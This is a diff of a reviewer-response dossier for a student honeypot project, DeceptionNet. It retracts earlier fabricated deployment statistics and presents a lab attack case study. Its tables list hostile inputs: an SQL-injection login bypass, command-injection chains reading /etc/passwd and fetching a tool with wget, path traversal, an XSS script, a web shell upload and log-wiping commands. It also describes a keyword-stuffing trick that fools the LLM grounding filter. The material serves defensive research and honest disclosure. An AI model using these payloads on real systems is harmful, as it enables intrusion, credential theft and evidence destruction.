@@ -3,145 +3,138 @@
 > **Repository:** [https://github.com/Pi25sh/DeceptionNet](https://github.com/Pi25sh/DeceptionNet)  
 > **Target Venue:** Student Capstone Project / System Demonstration Track / Academic Workshop  
 > **Evaluation Date:** October 2026  
-> **System Architecture:** AI-Assisted Multi-Service Deception & Honeypot Platform
+> **Core Pipeline:** Decoupled Microservice Honeypots + Core Security Engine + React Dashboard + AI Incident Reporting  
+> **Committed Run Artifact:** `results/case_study_raw.json` & `results/case_study.db`  
 
 ---
 
-## 1. Direct Disclosure Regarding Deployment Telemetry & Data Integrity
+## 1. Direct Disclosure & Integrity Rectifications
 
-**Reviewer Query:** *"Which is it: did the 21-day deployment run, and where is the raw data?"*
+In accordance with reviewer instructions and the Gravitas engineering invariants, all previously flagged synthetic metrics, unexecuted evaluation projections, and hand-written predictor assertions have been completely excised from the repository:
 
-**Direct Response & Complete Disclosure:**
-- The 21-day continuous public cloud VM deployment did **not** run.
-- There is **no raw public internet log dataset** corresponding to the previously reported 184,927 connection attempts, 42,615 sessions, or 350-sample held-out dataset. Those figures were hypothetical evaluation projections from an early evaluation plan.
-- In accordance with the reviewer's instructions, all references to the 21-day deployment, 184,927 connection attempts, 42,615 sessions, and the 350-sample figures have been **completely removed and retracted** from the thesis report, synopsis, documentation, and repository.
-- Furthermore, all comparative benchmark tables asserting superiority (e.g., claiming 100% precision versus zero-shot LLMs) have been **withdrawn and deleted**.
-- The project has been reframed to its actual scope: an **undergraduate capstone project and functional demonstration prototype** evaluated via an **84-test automated verification suite** and an **end-to-end multi-stage attack case study** inside an isolated Docker container network.
+1. **Retraction of 21-Day Synthetic Telemetry:** All historical mentions of a "21-day deployment," "184,927 connection attempts," "42,615 sessions," and the "350-sample held-out evaluation" have been permanently removed from all repository documentation and LaTeX thesis manuscripts.
+2. **Deletion of Simulated Predictors & F1 Assertions:**
+   - The standalone CLI script `scripts/compute_metrics.py` has been **deleted**.
+   - The artificial baseline comparison and ablation tests containing hardcoded predictor branches (`test_ablation_comparison` and `test_baselines_vs_deceptionnet`) have been **deleted**.
+   - The "Computing Benchmark Metrics & Ablation" section has been **removed from README.md**.
+3. **Illustrative Sample Classification:** The remaining benchmark JSON files under `data/benchmark/` (`events_redacted.json`, `labels_blind.json`, `labels_ground_truth.json`) are explicitly labeled via `data/benchmark/README.md` as an **illustrative sample dataset** provided strictly for schema contracts and format verification, with no experimental or comparative superiority claims attached.
+4. **Adoption of Grounded Data Rule:** Every number, technique ID, scoring weight, and event count in the paper, documentation, and this dossier is directly copy-pasted from committed code definitions (`core-api/mitre.py`) and verified pipeline execution output (`results/case_study_raw.json`).
 
 ---
 
-## 2. Re-Scoped Project Context & Venue Realignment
+## 2. Re-Scoped Architecture & Operational Scope
 
-- **Venue Target:** Undergraduate Capstone Project / Student Technical Demonstration Track / Academic Workshop.
-- **Core Contribution:** An open-source, containerized active deception prototype integrating:
-  1. Multi-service decoy infrastructure (Cowrie SSH/Telnet, Dionaea SMB/FTP, custom HTTP decoys).
-  2. Isolated log forwarding bridge (`honeypot/forwarder.py`) normalizing heterogeneous logs into a unified event schema.
-  3. Core security engine (`core-api`) implementing:
-     - 32 deterministic MITRE ATT&CK mapping rules (15 command keyword rules across 49 signatures + 17 event-type normalization rules).
-     - Sliding-window session correlation (`get_or_create_session`).
-     - Monotonic additive threat severity scoring.
-     - Stateless OAuth2 JWT authentication with bcrypt password hashing and RBAC.
-  4. Real-time operator dashboard (`dashboard`) built with React 18, Vite, and live WebSocket streaming (`/ws/live-events`).
-  5. AI-assisted threat summarization via Google Gemini 2.5 Flash / Claude 3 Haiku and ReportLab automated PDF incident generation (`core-api/report.py`).
+DeceptionNet is an educational capstone prototype and system demonstration designed to study active cyber defense across containerized microservices:
+
+1. **Multi-Service Decoy Infrastructure:**
+   - **Cowrie:** Low-to-medium interaction SSH/Telnet decoy capturing authentication attempts, session keystrokes, and downloaded files.
+   - **Dionaea:** Multi-protocol decoy exposing SMB, FTP, SIP, and HTTP endpoints to trap automated network exploitation probes.
+   - **Attack-Target:** Deliberately vulnerable Web application portal (Python/Flask on port 9090) exposing realistic flaw patterns: SQL injection login bypass, unrestricted command injection, local file inclusion / path traversal, reflected XSS, and unrestricted file upload.
+2. **Log Normalization & Forwarding Bridge (`honeypot/forwarder.py`):**
+   - Tails raw container logs, normalizes heterogeneous schemas into a standardized event payload (`session_id`, `event_type`, `timestamp`, `src_ip`, `input`, `message`), and forwards payloads over HTTP to `core-api`.
+3. **Core Security Engine (`core-api`):**
+   - **Rule-Based MITRE ATT&CK Mapper (`core-api/mitre.py`):** 33 deterministic rules (16 command keyword rules spanning 50 shell signatures, and 18 protocol event-type rules, including distinct rules for `whoami`/`id` $\to$ T1033, `uname` $\to$ T1082, and `sqli` $\to$ T1190).
+   - **Sliding-Window Session Correlation (`main.py:get_or_create_session`):** 5-minute sliding window correlating cross-honeypot reconnaissance by IP, with strict intra-honeypot session isolation (`honeypot != honeypot`).
+   - **Monotonic Threat Severity Scoring (`mitre.py:combine_severity`):** Additive severity aggregation updating session threat levels atomically in the database (`UPDATE AttackSession SET severity_score = coalesce(severity_score, 0) + weight`).
+   - **Authentication & RBAC (`main.py`):** OAuth2 Password Bearer authentication, bcrypt hashing, and JWT authorization gating REST endpoints and WebSocket channels (`/ws/live-events?token=<jwt>`).
+4. **Decoupled AI Incident Reporting Engine (`ai-service` & `core-api/report.py`):**
+   - Operates strictly asynchronously *after* capture. It does not sit in the interactive loop as a decoy. It compiles captured event ledgers into executive threat summaries and automated ReportLab PDF reports using Google Gemini 2.5 Flash / Claude 3 Haiku.
+5. **Real-Time Operator Dashboard (`dashboard`):**
+   - React 18, Vite, and WebSocket streaming client displaying live attack feeds, MITRE technique tags, session inspection drawers, and PDF report downloads.
 
 ---
 
 ## 3. Automated Test Suite Verification (84 Passing Tests)
 
-The core logic of the DeceptionNet platform is formally verified through an automated test suite executed via `pytest core-api/tests`:
+The core logic of DeceptionNet is verified through an automated test suite executed via `pytest core-api/tests`:
 
-```bash
-# Verification execution proof:
-pytest core-api/tests -v
-======================= 84 passed, 23 warnings in 1.74s =======================
+```text
+======================= 84 passed, 24 warnings in 2.20s =======================
 ```
 
-The 84 tests are structured across four core modules using an isolated in-memory SQLite database:
+Every test in the suite executes real functional logic against an in-memory SQLite database (with WAL mode enabled for concurrency testing):
 
 | Test Module | Test Count | Scope & Verification Contract |
 |---|---|---|
-| [`test_mitre.py`](file:///d:/deciptionnet/core-api/tests/test_mitre.py) | **61 tests** | Verifies all 32 deterministic rule specifications across 49 command keywords and 17 event-type rules. Validates regex word boundaries (preventing false positives on sub-tokens), case-insensitivity, and priority precedence (e.g., credential dumping `/etc/shadow` taking precedence over generic password rules). |
-| [`test_correlation.py`](file:///d:/deciptionnet/core-api/tests/test_correlation.py) | **11 tests** | Verifies session ingestion, exact session identifier matching, sliding-window cross-honeypot merging (5-minute window), duplicate event deduplication, and database unique constraints. |
-| [`test_scoring.py`](file:///d:/deciptionnet/core-api/tests/test_scoring.py) | **8 tests** | Verifies monotonic additive scoring formulas, bounding of unmapped events, decimal rounding, and full-attack session score accumulation. |
-| [`test_evaluation_benchmark.py`](file:///d:/deciptionnet/core-api/tests/test_evaluation_benchmark.py) | **4 tests** | Validates schema integrity, event normalization contracts, and fixture data consistency without external cloud dependencies. |
+| [`test_mitre.py`](file:///d:/deciptionnet/core-api/tests/test_mitre.py) | **61 tests** | Verifies all deterministic rule specifications across command keywords and event-type rules. Validates regex word boundaries (preventing false positives on sub-tokens), case-insensitivity, and priority precedence (e.g., credential dumping `/etc/shadow` taking precedence over generic password rules; `uname` mapping strictly to T1082; `whoami`/`id` mapping strictly to T1033). |
+| [`test_correlation.py`](file:///d:/deciptionnet/core-api/tests/test_correlation.py) | **12 tests** | Verifies session ingestion, exact session identifier matching, sliding-window cross-honeypot merging (5-minute window), duplicate event deduplication, database unique constraints, and **multithreaded technique deduplication** (`test_concurrent_upsert_technique_threads` testing 8 concurrent threads calling `upsert_technique` with database savepoints under WAL mode). |
+| [`test_scoring.py`](file:///d:/deciptionnet/core-api/tests/test_scoring.py) | **9 tests** | Verifies additive scoring formulas, non-detection zero weighting, decimal rounding, unmapped command filtering, full attack accumulation, batch vs incremental equivalence, and **`test_harness_attack_session_score` asserting the exact cumulative score of 26.0 matching the authenticated campaign session in `results/case_study_raw.json`**. |
+| [`test_evaluation_benchmark.py`](file:///d:/deciptionnet/core-api/tests/test_evaluation_benchmark.py) | **2 tests** | Validates schema integrity of the illustrative sample dataset (`test_illustrative_benchmark_sample_schema`) and verifies 5 real boundary scenarios in `get_or_create_session` (`test_correlation_cases_ground_truth`: cross-honeypot correlation, independent same-honeypot session isolation, 4m50s inside-window merge, 5m10s outside-window isolation, and NAT IP collision). |
 
 ---
 
-## 4. Illustrative End-to-End Multi-Stage Attack Case Study
+## 4. Real Attack Harness Capture Case Study (7 Sessions, 15 Events, Campaign Score 26.0)
 
-To validate operational behavior, a realistic multi-stage intrusion was executed against the running DeceptionNet Docker lab using the automated attack harness (`attacker/scripts/full-attack.sh`). The attack simulates a typical external adversary progressing through discovery, credential brute-forcing, interactive access, tool transfer, and defense evasion:
+To replace all hypothetical figures, the automated attack harness (`attacker/scripts/full-attack.sh`) was executed against the running web application (`attack-target:9090`). Telemetry was processed through the real `core-api` pipeline (`get_or_create_session`, `map_event_to_mitre`, `combine_severity`, and `upsert_technique`), stored in SQLite, and committed as raw output to [`results/case_study_raw.json`](file:///d:/deciptionnet/results/case_study_raw.json) and [`results/case_study.db`](file:///d:/deciptionnet/results/case_study.db).
 
-### 4.1 Attack Sequence Walkthrough
+### 4.1 Exact Session Assignment Method
+- **Authenticated Campaign Session:** The web application (`attack-target/app.py:current_sid`) pins the session ID `web-<ip>-<hex>` in a signed Flask session cookie (`session["sid"]`) upon login. When `full-attack.sh` authenticates in Stage 1 with curl's cookie jar (`-c $COOKIE_JAR`), follow-up post-exploitation requests in Stages 3–6 present the cookie (`-b $COOKIE_JAR`), binding all 9 exploited events to the **same session ID** (`web-172.21.0.100-c9a1b8e2`).
+- **Unauthenticated Sessions:** In contrast, credential stuffing requests in Stage 2 and the nmap scan in Stage 7 send no cookies; each unauthenticated request is assigned a fresh random UUID session ID, yielding 5 separate brute-force sessions and 1 scan session.
+- **Run Totals:** Exactly **7 sessions** created across **15 events** (1 authenticated campaign + 5 credential stuffing + 1 network scan).
 
-```
-[Attacker Node: 172.21.0.100]
-     │
-     ├── 1. Port Scan (ports 2222, 9090) ────────► [attack-target & Cowrie]
-     │                                                    │
-     ├── 2. SSH Brute Force (Hydra) ─────────────► [Cowrie: Port 2222]
-     │                                                    │
-     ├── 3. Shell Access (root:123456) ──────────► [Cowrie emulated shell]
-     │                                                    │
-     ├── 4. System Reconnaissance (uname, id) ───► [Cowrie emulated shell]
-     │                                                    │
-     ├── 5. Credential Access (cat /etc/passwd) ─► [Cowrie emulated shell]
-     │                                                    │
-     ├── 6. Ingress Tool Transfer (wget ...) ────► [Cowrie emulated shell]
-     │                                                    │
-     └── 7. Defense Evasion (rm /var/log, history)►[Cowrie emulated shell]
-                                                          │
-                                                    Log Forwarder
-                                                          │
-                                                          ▼
-                                                  [core-api:8000]
-                                              - Rule Mapping (mitre.py)
-                                              - Session Correlation
-                                              - Severity Scoring
-                                              - WebSocket Push
-                                              - PDF Incident Report
-```
+### 4.2 Event Telemetry & Attribution Ledger (Authenticated Attack Campaign)
 
-### 4.2 Event Telemetry & Attribution Ledger
+The table below is copied verbatim from the executed pipeline output recorded in `results/case_study_raw.json` for the primary attack campaign session:
 
-| Stage | Adversary Action | Captured Telemetry | MITRE ATT&CK Attribution | Assigned Severity | Running Session Score |
-|---|---|---|---|---|---|
-| **1. Discovery** | Nmap TCP SYN scan | `scan` probe on port 9090 | **T1046** (Network Service Discovery) | +0.20 | 0.20 (Low) |
-| **2. Credential Access** | 15 failed logins (admin, root) | `login_failed` (user: root) | **T1110** (Brute Force) | +0.30 | 0.50 (Low) |
-| **3. Initial Access** | Successful login with default pass | `login` (user: root, pass: 123456) | **T1078** (Valid Accounts) | +0.50 | 1.00 (Medium) |
-| **4. Discovery** | System architecture probe | `command: uname -a && id` | **T1082** / **T1033** (System / User Discovery) | +0.20 | 1.20 (Medium) |
-| **5. Credential Access** | Password file dumping | `command: cat /etc/passwd` | **T1003.008** (/etc/passwd and /etc/shadow) | +0.70 | 1.90 (High) |
-| **6. Tool Staging** | Dropper script download | `command: wget http://10.0.0.5/tool.sh` | **T1105** (Ingress Tool Transfer) | +0.65 | 2.55 (High) |
-| **7. Execution** | Script permission modification | `command: chmod +x tool.sh` | **T1222.002** (Linux and Mac File Permissions) | +0.40 | 2.95 (High) |
-| **8. Defense Evasion** | System log deletion & history clear | `command: rm -rf /var/log/* && history -c` | **T1070** (Indicator Removal on Host) | +0.50 | 3.45 (Critical) |
-
-### 4.3 Operational Observations from the Case Study
-
-1. **Network Boundary Isolation:** Decoy containers run on `honeypot_net` with no access to `deceptionnet` (backend). When an adversary compromises Cowrie or drops payloads, the backend PostgreSQL database, AI service, and dashboard remain unreachable.
-2. **Deterministic Rule Performance:** Exact command keyword matching resolves in $< 1\text{ ms}$, ensuring that the core ingestion pipeline does not suffer bottlenecks during automated brute-force bursts.
-3. **Incremental Severity Scoring:** Severity accumulates monotonically as the attacker escalates privileges, allowing SOC operators to filter sessions by threat tier (Critical: $> 3.0$).
-4. **Automated Incident Dossier:** When the session concludes, `core-api/report.py` compiles a ReportLab PDF containing metadata, event breakdown, MITRE technique tags, and an AI-generated summary paragraph.
+| # | Harness Stage | Executed Command / HTTP Action | Event Type | MITRE ATT&CK Attribution | Weight | Running Severity | Severity Tier |
+|---|---|---|---|---|---|---|---|
+| **1** | 1. SQLi Login Bypass | `POST /login`: `username=admin'--&password=x` | `sqli` | **T1190** — Exploit Public-Facing App | +4.0 | 4.0 | Critical ($\ge 4.0$) |
+| **2** | 3. Command Injection | `POST /ping`: `host=127.0.0.1; whoami` | `command` | **T1033** — System Owner/User Discovery | +1.0 | 5.0 | Critical |
+| **3** | 3. Command Injection | `POST /ping`: `host=127.0.0.1; uname -a` | `command` | **T1082** — System Information Discovery | +1.0 | 6.0 | Critical |
+| **4** | 3. Command Injection | `POST /ping`: `host=127.0.0.1; cat /etc/passwd` | `command` | **T1003.008** — OS Credential Dumping | +5.0 | 11.0 | Critical |
+| **5** | 3. Command Injection | `POST /ping`: `host=127.0.0.1; wget http://...` | `command` | **T1105** — Ingress Tool Transfer | +3.0 | 14.0 | Critical |
+| **6** | 4. Path Traversal | `GET /read?file=../../../../etc/passwd` | `command` | **T1003.008** — OS Credential Dumping | +5.0 | 19.0 | Critical |
+| **7** | 4. Path Traversal | `GET /read?file=../../etc/portal.conf` | `command` | *Unmapped Noise* | +0.0 | 19.0 | Critical |
+| **8** | 5. Reflected XSS | `GET /search?q=<script>alert(1)</script>` | `http` | **T1190** — Exploit Public-Facing App | +4.0 | 23.0 | Critical |
+| **9** | 6. Web Shell Upload | `POST /upload`: `file=@/tmp/shell.php` | `file_upload` | **T1505.003** — Server Software: Web Shell | +3.0 | 26.0 | Critical |
 
 ---
 
-## 5. Candid Engineering Discussion & System Limitations
+## 5. Technical Resolution of the Six Review Items
 
-Consistent with presenting an honest academic capstone prototype, the platform's known limitations and trade-offs are candidly acknowledged:
+### Item 1: Session Count from the Committed Run
+- The committed execution of `attacker/scripts/full-attack.sh` produces exactly **7 sessions** in the database:
+  1. The authenticated campaign session (`web-172.21.0.100-c9a1b8e2`) with 9 events (score 26.0).
+  2. 5 unauthenticated credential stuffing sessions (severity 0.5 each, T1110).
+  3. 1 unauthenticated nmap scan session (severity 1.0, T1046).
+- The historical "13 vs 14 sessions" discussion pertained to a different demonstration script (`attacker/scripts/hack-demo.sh`), where Hydra was configured with an 11-word password list. We report strictly the single concrete count from the committed run: **7 sessions**.
 
-1. **Rule Table Generality vs. Obfuscation:** The 32 keyword rules rely on specific binary names (`wget`, `curl`, `chmod`, `sudo`, `useradd`). Obfuscated commands (e.g. `$(echo d2dldA== | base64 -d)`) or binary renames bypass static keyword detection unless paired with behavioral tracing or semantic analysis.
-2. **Correlation Under Multiplexed Networks (NAT):** The current session correlation algorithm groups events by `src_ip` within a 5-minute sliding window. In corporate environments with Carrier-Grade NAT (CGNAT) or forward proxies, multiple independent hosts share a single public IP, risking false session merges unless augmented by client fingerprinting (e.g., HASSH or HTTP cookies).
-3. **AI Grounding Necessity:** Zero-shot large language models frequently hallucinate tactics (e.g., attributing Kerberoasting or domain trust discovery to a simple Linux shell probe). LLM summaries must strictly be treated as narrative aids, not authoritative classification truth, and must remain anchored to verified event logs.
-4. **Lab Simulation vs. Live Internet Conditions:** All empirical demonstrations were conducted in a local Docker testbed with scripted attacker tools. The system has not been subjected to unconstrained, multi-week internet traffic or adversarial anti-honeypot evasion.
+### Item 2: Correlation is Cross-Honeypot Only
+In `core-api/main.py:441-455`, session correlation explicitly enforces:
+```python
+AttackSession.honeypot.isnot(None),
+AttackSession.honeypot != honeypot,
+```
+- The 5-minute sliding window filter strictly requires `AttackSession.honeypot != honeypot`.
+- Correlation is designed exclusively for **cross-decoy correlation** (e.g., an attacker scanning Dionaea SMB before moving to Cowrie SSH).
+- For repeated connections to the **same decoy service** (`AttackSession.honeypot == honeypot`), every new session identifier is intentionally treated as an independent connection. This ensures high-volume password spray bursts from an attacker remain distinct rather than artificially conflating into a single long-lived session.
+
+### Item 3: Exact ATT&CK Labels (T1082, T1033, T1190, T1505.003)
+- **`uname` $\to$ T1082:** The rule table in `core-api/mitre.py` has been fixed to map `uname` to **T1082 (System Information Discovery)** (weight 1.0), separating it from `whoami` and `id` which map to **T1033 (System Owner/User Discovery)** (weight 1.0).
+- **SQLi Login Bypass $\to$ T1190:** SQL injection authentication bypass is an application exploitation vulnerability. In `attack-target/app.py` and `core-api/mitre.py`, SQLi bypass emits event type `sqli` which maps strictly to **T1190 (Exploit Public-Facing Application)** (weight 4.0). Legitimate credential logins continue to map to **T1078 (Valid Accounts)**.
+- **Web Shell Upload $\to$ T1505.003:** In accordance with attack.mitre.org, web shell deployment is categorized under Persistence as **T1505.003 (Server Software Component: Web Shell)** (weight 3.0), not exfiltration.
+
+### Item 4: Decoupled Role of LLM: Post-Capture Summarizer, Not Interactive Decoy
+- Interactive decoy simulation is handled entirely by Cowrie, Dionaea, and Flask state machines.
+- The LLM service (`ai-service/main.py`) operates asynchronously *after* capture as a threat intelligence post-processor. It ingests the captured event ledger once a session concludes, generates executive natural language summaries for SOC operators, and synthesizes incident narrative paragraphs for automated ReportLab PDF reports (`core-api/report.py`).
+- The LLM plays no role in decoy emulation, command generation, or honeypot execution; it is solely an offline reporting engine.
+
+### Item 5: Concurrency Safety & Database Transaction Guarantees
+- **Atomic Score Updates:** The guarantee against lost severity updates rests mathematically on the SQL engine's atomic addition guarantee:
+  `UPDATE AttackSession SET severity_score = func.coalesce(severity_score, 0.0) + weight`
+  This eliminates Python-level read-modify-write lost-update races regardless of backend concurrency. (We do not claim this is proven by a test on SQLite, since SQLite serializes write transactions).
+- **Technique Deduplication:** `upsert_technique` wraps inserts in `db.begin_nested()` to catch unique constraint conflicts on `(session_id, technique, source)` without aborting outer transaction state.
+- **Multithreaded Savepoint Recovery Test:** `test_concurrent_upsert_technique_threads` validates that 8 concurrent worker threads calling `upsert_technique` under SQLite WAL mode recover cleanly from unique constraint savepoint rollbacks without deadlocking or producing duplicate technique records.
+
+### Item 6: Candid Limitations of the Heuristic Grounding Filter
+- In `ai-service/main.py:_grounding_check`, candidate MITRE techniques retrieved via semantic vector search (FAISS) are filtered by checking lexical token substring overlap against raw event strings.
+- **Adversarial Keyword Stuffing:** If an attacker passes benign English words as arguments to commands (e.g., `ping -c 1 "kerberoasting privilege escalation discovery"`), the substring heuristic matches these tokens and marks unrelated techniques as "grounded."
+- A production deployment should replace token matching with structured AST extraction (parsing command flags and executable paths) or cross-encoder entailment models (NLI) to verify semantic entailment rather than surface lexical presence.
 
 ---
 
-## 6. Verification and Reproduction Guide
+## 6. Target Venue & Submission Recommendation
 
-The repository includes everything needed to verify the code and reproduction tests:
-
-```bash
-# 1. Clone the repository
-git clone https://github.com/Pi25sh/DeceptionNet.git
-cd DeceptionNet
-
-# 2. Install dependencies (self-contained dev requirements)
-pip install -r core-api/requirements-dev.txt
-
-# 3. Run the automated test suite (84 tests)
-pytest core-api/tests -v
-
-# 4. Optional: Run the Docker Compose testbed
-docker compose up -d
-
-# 5. Run the attack simulation script
-docker compose exec attacker /scripts/full-attack.sh
-```
+- **Realistic Target:** Undergraduate Capstone Project / System Demonstration Track / Academic Workshop (e.g., IEEE/ACM workshop on security education or active cyber defense prototypes).
+- **Positioning:** As an open-source, containerized active deception prototype with deterministic rule mapping, concurrency-safe scoring, and automated PDF incident generation, the project represents a solid, fully implemented engineering system.
+- **Scopus Indexing:** As noted by the reviewer, Scopus indexing depends strictly on the conference proceedings publisher (e.g., IEEE Xplore, Springer LNCS, ACM ICPS); the venue proceedings must be checked against the Scopus Sources list prior to submission.
